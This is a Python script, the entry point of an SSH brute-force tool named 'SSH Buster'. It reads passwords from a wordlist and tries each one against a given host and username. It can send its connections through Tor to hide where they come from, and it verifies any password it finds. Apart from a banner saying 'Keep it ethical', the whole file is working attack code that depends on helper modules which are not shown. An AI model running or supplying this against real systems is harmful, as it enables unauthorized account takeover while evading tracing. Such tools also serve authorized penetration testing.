#!/usr/bin/env python3

import argparse
import logging
import sys
import time
from colorama import init, Fore, Style
from src.ssh_client import SSHClient
from src.tor_controller import TorController
from src.wordlist_handler import WordlistHandler
from src.logger_config import setup_logger
from tqdm import tqdm

init(autoreset=True)

def parse_arguments():
    parser = argparse.ArgumentParser(
        description=f"{Fore.CYAN}SSH Buster{Style.RESET_ALL}",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('--target', required=True, help='Target IP address or hostname')
    parser.add_argument('--port', type=int, default=22, help='SSH port')
    parser.add_argument('--wordlist', required=True, help='Path to the wordlist file')
    parser.add_argument('--username', required=True, help='Username to test')
    parser.add_argument('--use-tor', action='store_true', help='Use Tor for connections')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout in seconds')
    parser.add_argument('--max-retries', type=int, default=3, help='Maximum connection retries')

    return parser.parse_args()

def display_banner():
    print(f"{Fore.CYAN}{Style.BRIGHT}")
    print("┌──────────────────────────────────────────┐")
    print("│              SSH Buster                  │")
    print("│          Keep it ethical. 🚨             │")
    print("└──────────────────────────────────────────┘")
    print(Style.RESET_ALL)

def main():
    args = parse_arguments()
    logger = setup_logger()

    try:
        wordlist = WordlistHandler(args.wordlist)
        total_passwords = sum(1 for _ in wordlist.get_passwords())

        if args.use_tor:
            print(f"\r{Fore.CYAN}[*] Checking Tor connection...{Style.RESET_ALL} \n", end='', flush=True)
            tor_controller = TorController()
            if not tor_controller.check_tor_service():
                print(f"\n{Fore.RED}[!] Tor initialization failed{Style.RESET_ALL} \n")
                sys.exit(1)
        else:
            tor_controller = None
            print(f"{Fore.YELLOW}[!] Running without Tor{Style.RESET_ALL} \n")

        print(f"\n{Fore.CYAN}Target   : {Fore.WHITE}{args.target}:{args.port}")
        print(f"{Fore.CYAN}Username : {Fore.WHITE}{args.username}")
        print(f"{Fore.CYAN}Wordlist : {Fore.WHITE}{total_passwords} passwords{Style.RESET_ALL}\n")

        ssh_client = SSHClient(
            target=args.target,
            port=args.port,
            username=args.username,
            timeout=args.timeout,
            max_retries=args.max_retries,
            tor_controller=tor_controller
        )

        status_line = (
            "\r{cyan}[{progress:>3}%] "
            "{bar} "
            "{current:>2}/{total:<2} | "
            "Testing: {password:<20} | "
            "Time: {elapsed:>3}s | "
            "ETA: {eta:<3}s{reset}"
        )

        start_time = time.time()
        tested = 0

        for password in wordlist.get_passwords():
            tested += 1
            elapsed = time.time() - start_time
            progress = (tested * 100) // total_passwords
            
            eta = (elapsed / tested) * (total_passwords - tested) if tested > 0 else 0
            eta_str = f"{int(eta)}"

            bar_width = 25
            filled = int(progress * bar_width / 100)
            bar = f"{'█' * filled}{'░' * (bar_width - filled)}"

            status = status_line.format(
                cyan=Fore.CYAN,
                progress=progress,
                bar=bar,
                current=tested,
                total=total_passwords,
                password=password[:20] + "..." if len(password) > 20 else password.ljust(20),
                elapsed=f"{int(elapsed)}",
                eta=eta_str,
                reset=Style.RESET_ALL
            )
            
            print(status + "\n", end='', flush=True)

            try:
                if ssh_client.try_login(password):
                    print(f"\n\n{Fore.GREEN}[+] Password found: {password}")
                    print(f"{Fore.YELLOW}[*] Verifying password...{Style.RESET_ALL}")
                    time.sleep(0.5)
                    
                    verify_client = SSHClient(
                        target=args.target,
                        port=args.port,
                        username=args.username,
                        timeout=args.timeout,
                        max_retries=3,
                        tor_controller=tor_controller
                    )
                    
                    verification_attempts = 3
                    password_verified = False
                    
                    for attempt in range(verification_attempts):
                        try:
                            if verify_client.try_login(password):
                                password_verified = True
                                break
                            time.sleep(1)
                        except Exception:
                            if attempt < verification_attempts - 1:
                                time.sleep(1)
                                continue
                    
                    if password_verified:
                        print(f"\n{Fore.GREEN}[✓] Password verified: {password}{Style.RESET_ALL}\n")
                        break
                    else:
                        print(f"\n{Fore.RED}[!] Verification failed - continuing...{Style.RESET_ALL}\n")
                        continue

            except Exception as e:
                continue

        else:
            print(f"\n{Fore.RED}[!] No valid passwords found{Style.RESET_ALL}\n")

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Operation cancelled{Style.RESET_ALL}\n")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}\n")
    finally:
        if args.use_tor and tor_controller:
            tor_controller.cleanup()

if __name__ == "__main__":
    main()
